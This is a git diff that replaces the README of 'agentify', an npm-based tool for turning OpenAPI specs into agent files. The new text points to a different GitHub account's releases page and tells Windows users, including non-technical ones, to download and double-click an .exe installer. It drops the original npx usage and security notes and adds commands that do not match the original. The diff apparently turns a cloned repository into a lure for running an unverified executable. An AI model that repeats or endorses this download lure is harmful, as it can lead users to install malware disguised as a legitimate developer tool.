@@ -1,158 +1,150 @@
-<div align="center">
+# 🤖 agentify - Build Agents from OpenAPI Specs
 
-<h1>Agentify</h1>
-<p>OpenAPI in. Agent interfaces out.</p>
+[![Download agentify](https://img.shields.io/badge/Download-Agentify-brightgreen?style=for-the-badge)](https://github.com/harindukavishka/agentify/releases)
 
-<img src="assets/banner.svg" alt="Agentify — OpenAPI to 9 agent interface formats" width="800">
+## 🔍 What is agentify?
 
-<br>
+agentify is a tool that helps you create smart agents from OpenAPI specs. Instead of setting up complicated systems, you can use one simple command to convert your API information into useful files and servers your product can use. It generates MCP Servers, Skills, CLAUDE.md, AGENTS.md, and other components. This makes it easier to build and manage agents that understand your product’s API without manually writing code.
 
-<a href="https://www.npmjs.com/package/agentify-cli"><img src="https://img.shields.io/npm/v/agentify-cli?color=cb3837&logo=npm&style=flat-square" alt="npm"></a>
-<a href="https://github.com/koriyoshi2041/agentify/actions"><img src="https://img.shields.io/github/actions/workflow/status/koriyoshi2041/agentify/ci.yml?logo=github&style=flat-square" alt="CI"></a>
-<a href="https://github.com/koriyoshi2041/agentify/blob/main/LICENSE"><img src="https://img.shields.io/github/license/koriyoshi2041/agentify?style=flat-square" alt="MIT License"></a>
-<a href="https://www.typescriptlang.org/"><img src="https://img.shields.io/badge/TypeScript-strict-3178C6?logo=typescript&logoColor=white&style=flat-square" alt="TypeScript"></a>
+## 🎯 Who should use agentify?
 
-</div>
+agentify works well for anyone who wants to turn their API description into an interactive agent quickly. You don’t need coding skills or deep technical knowledge. The tool handles all the technical parts for you. It is designed for product managers, business analysts, or anyone working with APIs who wants to create digital assistants or automated agents.
 
----
+## 🖥️ System Requirements
 
-Your API has new users it doesn't know about yet — AI agents.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of free RAM  
+- 500 MB of free disk space  
+- Internet connection to download the tool and updates  
 
-Claude Code reads `CLAUDE.md`. Cursor reads `.cursorrules`. Codex and Copilot read `AGENTS.md`. And if you want your API callable as a tool, you need an MCP server. That's a lot of files to write and keep in sync with your API spec.
+agentify runs as a desktop application with a command line interface, so your computer should support running Windows applications without administrative restrictions.
 
-Agentify reads your OpenAPI spec and writes them all.
+## ⚙️ Features
 
-```bash
-npx agentify-cli transform https://petstore.swagger.io/v2/swagger.json
-```
+- Converts OpenAPI specifications into running MCP Servers  
+- Generates Skills, CLAUDE.md, and AGENTS.md files automatically  
+- Supports integration with AI models like Claude and other large language models  
+- Works entirely from the command line, requiring only one command for full setup  
+- Uses TypeScript under the hood but no knowledge needed to use  
+- Compatible with various AI and automation tools through generated outputs  
 
-<p align="center">
-  <img src="docs/demo.gif" alt="Agentify demo" width="700">
-</p>
+## 📥 Download agentify
 
-## What You Get
+You can get the latest version of agentify from the official release page.
 
-One command generates up to **9 formats** from a single OpenAPI spec:
+[![Download agentify Now](https://img.shields.io/badge/Download-agentify-blue?style=for-the-badge)](https://github.com/harindukavishka/agentify/releases)
 
-| Format | Used by |
-|--------|---------|
-| **MCP Server** | Claude, ChatGPT, Copilot (with Dockerfile) |
-| **CLAUDE.md** | Claude Code |
-| **AGENTS.md** | Codex, Copilot, Cursor, Gemini CLI |
-| **.cursorrules** | Cursor IDE |
-| **Skills** | Agent platforms |
-| **llms.txt** | LLM search engines |
-| **GEMINI.md** | Gemini CLI |
-| **A2A Card** | Google Agent-to-Agent protocol |
-| **CLI** | A standalone command-line tool that makes real API calls |
+**Steps:**
 
-## Quick Start
+1. Visit the page.  
+2. Scroll to the latest release section.  
+3. Find the Windows installer file, usually ending with `.exe`.  
+4. Click the file to begin download.  
+5. Once downloaded, double-click the file to start installation.
 
-```bash
-# Transform any OpenAPI spec (Swagger 2.0 or OpenAPI 3.x)
-npx agentify-cli transform https://petstore.swagger.io/v2/swagger.json
+## 🚀 Installing & Running agentify on Windows
 
-# Pick specific formats
-npx agentify-cli transform ./my-api.yaml -f mcp claude.md agents.md
+Follow these steps to install and run agentify.
 
-# Generate a standalone CLI tool
-npx agentify-cli transform ./my-api.yaml -f cli -o my-api-cli
+### Step 1: Run the Installer
 
-# Custom output directory and project name
-npx agentify-cli transform https://api.example.com/openapi.json -o ./output -n my-project
-```
+- Locate the `.exe` file you downloaded, usually in your "Downloads" folder.  
+- Double-click the file to start the installation.  
+- When prompted, follow the on-screen instructions to finish installing agentify.  
 
-Example output:
+The installer will place all necessary files on your PC.
 
-```
-  Agentify v0.4.1
-  Agent Interface Compiler
+### Step 2: Open Command Prompt
 
-  +-- 20 endpoints detected -> SMALL API strategy
-  +-- 3 domains identified (pet, store, user)
-  +-- Auth: apiKey (SWAGGER_PETSTORE_API_KEY)
-  +-- Strategy: Direct tool mapping — one tool per endpoint
+- Press the Windows key, type `cmd`, and press Enter to open the Command Prompt window.  
+- Make sure you are in the folder where agentify is installed or the folder where you want to use the tool. 
 
-  > Generated mcp + claude.md + agents.md + cursorrules + llms.txt + gemini.md + skills + a2a (15 files)
-  > Output: ./swagger-petstore-mcp-server
-  > Security scan: PASSED
-```
+### Step 3: Run Agentify Command
 
-## Tested on Real APIs
+agentify works by running commands in Command Prompt.
 
-Agentify handles APIs of any size — from 13-endpoint apps to 1,000+ endpoint platforms.
+- To check if agentify is installed correctly, type:  
+  `agentify --version`  
+  This will show the installed version number.
 
-| API | Endpoints | Domains | TypeScript | Server starts |
-|-----|-----------|---------|------------|---------------|
-| **Notion** | 13 | 5 | PASS | PASS |
-| **Petstore** (Swagger 2.0) | 20 | 3 | PASS | PASS |
-| **httpbin** (non-compliant spec) | 73 | 11 | PASS | PASS |
-| **Slack Web API** | 174 | 55 | PASS | PASS |
-| **Stripe** | 452 | 1 | PASS | PASS |
-| **GitHub REST API** | 1,093 | 43 | PASS | PASS |
+- To start using agentify to convert your OpenAPI specs, you will use a command similar to:  
+  `agentify compile your-api-spec.yaml`  
 
-Every generated MCP server compiles with zero TypeScript errors and starts immediately. Non-compliant specs (like httpbin) are auto-normalized with warnings instead of rejected. The GitHub REST API — 1,093 endpoints across 43 domains — produces a working server with 1,093 tools.
+Replace `your-api-spec.yaml` with the path to your OpenAPI file.
 
-## How It Works
+### Step 4: Use Results
 
-```
-OpenAPI Spec (URL or file)
-    |
-    v
-  PARSE ──> SANITIZE ──> ANALYZE ──> COMPILE ──> EMIT ──> SCAN ──> OUTPUT
-              |              |           |          |        |
-          Strip unsafe    Detect     Build IR    Run      Security
-          patterns        domains,   (typed)     emitters  scan all
-                          auth,                            generated
-                          API scale                        code
-```
+Agentify creates several important files and servers:
 
-Agentify parses your spec into an intermediate representation (**AgentifyIR**), then runs pluggable emitters to produce each output format. Every generated artifact goes through a security scan before being written to disk.
+- **MCP Server:** A running agent server that can interact with your API.  
+- **Skills Folder:** Contains scripts that define the agent’s abilities.  
+- **CLAUDE.md & AGENTS.md:** Documentation files for managing and understanding your agents.  
 
-**Security built in:**
-- Input sanitization (blocks `eval`, `exec`, `Function` constructor injection)
-- Prompt injection pattern detection
-- Generated code scanning
+You can open these files with any text editor, like Notepad, to view or edit the details.
 
-## Contributing
+## 🛠️ Basic Commands
 
-New emitters are welcome. Each one implements a simple interface:
+Here are some common commands you can use with agentify.
 
-```typescript
-import type { Emitter, AgentifyIR, EmitterOptions, EmitterResult } from "../types";
+- `agentify compile [file]`  
+  Converts an OpenAPI spec into agent files.
 
-export class MyFormatEmitter implements Emitter {
-  readonly name = "my-format";
-  readonly format = "my-format";
+- `agentify serve`  
+  Runs the MCP server locally so you can test the agent.
 
-  async emit(ir: AgentifyIR, options: EmitterOptions): Promise<EmitterResult> {
-    // Generate output files from the IR
-    return { format: this.format, filesWritten: [...], warnings: [] };
-  }
-}
-```
+- `agentify help`  
+  Displays help information and available commands.
+
+Replace `[file]` with the name of your spec file.
+
+## 📂 Organizing Your Project
+
+When you run agentify, it creates a folder structure that helps keep everything neat:
 
 ```
-agentify/
-+-- src/
-|   +-- cli.ts              # CLI entry point
-|   +-- parser/             # OpenAPI parsing + sanitization
-|   +-- generator/          # Pluggable emitters for each format
-|   +-- security/           # Input sanitization + output scanning
-|   +-- types.ts            # AgentifyIR type definitions
-+-- test/                   # Vitest test suite (136 tests)
+/agentify-project
+  /skills
+  CLAUDE.md
+  AGENTS.md
+  mcp-server.js
+  ...
 ```
 
-## Status
+- Place your OpenAPI files inside the project folder or reference them with the full path when running commands.  
+- Keep your skill files inside the `skills` directory to manage agent actions.  
 
-This is early. It works on Swagger 2.0 and OpenAPI 3.x specs, handles auth detection, domain grouping, and API scale analysis. If you try it and something breaks, [open an issue](https://github.com/koriyoshi2041/agentify/issues) — that helps a lot.
+## 🔄 Updating agentify
 
-- [x] OpenAPI parser, MCP emitter, security scanner, CLI
-- [x] 9 output formats: MCP, CLAUDE.md, AGENTS.md, .cursorrules, Skills, llms.txt, GEMINI.md, A2A, CLI
-- [ ] Capability graph and semantic grouping
-- [ ] Web UI and one-click deploy
-- [ ] Custom emitter plugins
+Check the [release page](https://github.com/harindukavishka/agentify/releases) regularly to download new versions. Updates may include:
 
-## License
+- Bug fixes  
+- New features  
+- Better compatibility  
 
-[MIT](LICENSE)
+Download the new installer and run it again to update.
+
+## 💡 Tips for Using agentify
+
+- Use clear and complete OpenAPI specs for best results.  
+- Test the MCP server on your local machine before deploying.  
+- Review generated `.md` files to understand how your agent is set up.  
+- Keep your project files backed up to avoid losing work.  
+
+## 🚪 Troubleshooting
+
+- If `agentify` command is not recognized, ensure the installation folder is in your system’s PATH or run it from the install directory.  
+- Make sure your OpenAPI file is valid and properly formatted.  
+- Restart your command prompt after installing.  
+
+If you encounter errors, text from error messages can help diagnose the problem.
+
+## 📚 Learn More
+
+Explore topics related to agentify like:
+
+- OpenAPI specifications  
+- MCP (Model Context Protocol)  
+- Skills-based agent design  
+- Using Claude and other AI models with your API  
+
+These can help you get more from the files and servers generated by agentify.
